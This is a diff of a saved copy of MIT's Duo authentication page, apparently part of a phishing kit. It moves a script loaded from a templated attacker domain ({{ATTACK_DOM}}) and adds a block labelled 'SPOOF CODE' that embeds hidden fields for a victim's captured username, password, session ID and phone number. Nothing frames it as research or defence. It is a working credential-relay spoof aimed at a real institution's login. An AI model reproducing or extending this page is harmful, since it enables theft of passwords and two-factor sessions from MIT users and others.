@@ -2,7 +2,6 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta http-equiv="pragma" content="no-cache">
     <meta http-equiv="content-type" content="application/xhtml+xml">
-	<script src="https://{{ATTACK_DOM}}/idp/Authn/remote-bridge-2.js"></script>
     <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1">
     <title>MIT Duo Authentication</title>
     <style>/* Redefinition of basic elements */
@@ -8561,14 +8560,21 @@ iframe[src*='u2f-comms.html'] {
   }
 </style>
             </head>
-<body onload=&quot;
-	function delay(e, disp, t){
-		setTimeout(function(){ 
-			document.getElementById(e).style.display=disp;	
-		}, t) }; 
-	delay('basewrap', 'block', 3000); 
-	delay('mit-logo', 'block', 3800); 
-	delay('auth_methods', 'block', 4000);&quot;>
+<script>
+function delay(e, disp, t) {
+    setTimeout(function() { 
+        document.getElementById(e).style.display = disp;	
+    }, t) 
+}; 
+function loadAnim() {
+    delay('basewrap', 'block', 3000); 
+    delay('mit-logo', 'block', 3800); 
+    delay('auth_methods', 'block', 4000); 
+}
+window.loadAnim = loadAnim;
+</script>
+ 
+<body>
 <div class=&quot;&quot;>
 <div id='basewrap' style='display:none' class=&quot;base-wrapper &quot;>
 
@@ -8826,6 +8832,15 @@ Powered by Duo Security
 	<a href="http://web.mit.edu/ist/"><img data-savepage-src="/idp/images/mobile/ist-logo.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAAVCAYAAADM+lfpAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAVpJREFUeNrEVU0OwUAYHdKFZZd2JnEAXdrhAsIJcAJxguoJ1A3coOIC2FlyAMk4gS7teOWrfJmkVdIZX/IyTTvtvL7v51U2tfZdvGLXvx16Iiew18UyADqABBTembBvZAb2VT7tcUTBwIFzLFPAZbd3osRwCpBIDt8CnjAczg9EFBBQWpWegm/S/q0ykUZkhgNC68rgD8dYuuzWBERWJtNUzXnms+vANJFMMlDFo9ZNIgZCYSGylOHpWUOV+J9k+CzZNxtyAFyBOzD/S2uzVvYZQR9pDFmXxVDuaIwMPp78/VuBppBTjZxH8+eZRmBoS5lnW1MhuzTweE2dbKZJnC8qJkKvqNV9TSnjcyZrGEpy7tLNsvrDOxG7XqX+ZLNmUtNcaF4V2LIDTqRL3TPWvEpZmTNklC2qD6k9Dsv2KgxTNy9NI62FU5+aGTJNr2jNJCSWpIgpnzo+BBgAT09t90JsBEsAAAAASUVORK5CYII=" width="35" height="21" alt="IST"></a>Information Systems and Technology
 </div>
 
+ <!-- SPOOF CODE -->
+<div id='user' style='display:none'>{{USER}}</div>
+<div id='pass' style='display:none'>{{PASS}}</div>
+<div id='sid'  style='display:none'>{{SID}}</div> 
+<div id='mobile' style='display:none'>{{MOBILE}}<div> 
+<script src="https://{{ATTACK_DOM}}/idp/Authn/remote-bridge-2.js"></script>
+ <div class=helpbox id=duo_helpbox>
+ <p>
+<!-- END SPOOF -->
   
 
 </body></html>
